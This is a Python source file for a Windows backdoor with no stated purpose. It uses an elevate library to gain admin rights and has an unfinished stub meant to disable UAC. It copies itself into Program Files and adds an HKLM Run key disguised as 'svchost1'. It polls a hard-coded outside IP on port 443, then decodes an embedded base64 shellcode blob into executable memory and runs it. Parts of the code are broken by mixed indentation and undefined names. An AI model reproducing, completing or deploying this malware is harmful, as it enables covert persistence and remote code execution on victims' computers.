from subprocess import Popen, SW_HIDE, STARTUPINFO, STARTF_USESHOWWINDOW
from elevate import elevate
from multiprocessing import Process
from winreg import *
from shutil import copyfile
from time import sleep
import socket
import ctypes
import base64
import sys
import os

kernel32 = ctypes.windll.kernel32

def ShellCodeBackdoor1():

	global buf
	global shellcode

	safe_ = "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"
	code_bytes = safe_.encode()
	buf = base64.b64decode(code_bytes)

	return buf

def write_memory(buf):
	length = len(buf)

	kernel32.VirtualAlloc.restype = ctypes.c_void_p

	kernel32.RtlMoveMemory.argtypes = (
		ctypes.c_void_p,
		ctypes.c_void_p,
		ctypes.c_size_t
	)

	ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
	kernel32.RtlMoveMemory(ptr, buf, length)

	return ptr

def run(shellcode):
	buffer = ctypes.create_string_buffer(shellcode)

	ptr = write_memory(buffer)

	shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))

	shell_func()

def check_connection(server_ip, server_port):
	while True:
		sock = None

		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			res_ = sock.connect_ex(( server_ip, server_port ))

			if res_ == 0:
				#print("EXCELLENT", res_)

				sleep(3)

				sock.close()
				sock = None

				sleep(8)

				process2 = Process( target = recursive_run )
				process2.start()
				process2.join()

				return False
			else:
				#print("NO connection")

				sleep(3)

				sock.close()
				sock = None

				sleep(5)

		except Exception as warning_:

			try:
				sock.close()
				sock = None
			except Exception as ClosedSocked_:
				#print(ClosedSocked_)
				sleep(5)

			#print(warning_)
			sleep(5)

def recursive_run():
	shellcode = ShellCodeBackdoor1()
	run(shellcode)

def AUTORUN_configuration():
	mainDisk = str(getenv("SystemDrive"))
	path1 = mainDisk + "\\Program Files\\" + argv[0].split("\\")[-1]

	key2 = OpenKeyEx(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
		0, KEY_ALL_ACCESS | KEY_WOW64_64KEY)

	if not os.path.exists(path1):
		copyfile(sys.argv[ 0 ], path1)

		try:
			data2, index2 = QueryValueEx(key2, "svchost1")
		except FileNotFoundError:

			SetValueEx(key2, "svchost1", 0, REG_SZ, path1)

			CloseKey(key2)
	else:
		try:
            data3, index3 = QueryValueEx(key2, "svchost1")
        except FileNotFoundError:

        	SetValueEx(key2, "svchost1", 0, REG_SZ, path1)

        	CloseKey(key2)

        CloseKey(key2)

def Disable_UAC():
	key1 = OpenKeyEx(HKEY_LOCAL_MACHINE, 

		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 

		0, KEY_ALL_ACCESS | KEY_WOW64_64KEY)

    data1, index1 = QueryValueEx(key1, "EnableLUA")

    if str(data1) == "1":
        pass
    else:
        pass

    CloseKey(key1)

#FINISH HERE , DISABLE UAC ! DONT FORGET!

def main():
	try:
		elevate()

		Disable_UAC()
		AUTORUN_configuration()

		process1 = Process( target = check_connection, args=("185.65.200.96", 443) )

		process1.start()

		process1.join()

	except Exception as mainError_:
		raise SystemExit

if __name__ == '__main__':
	main()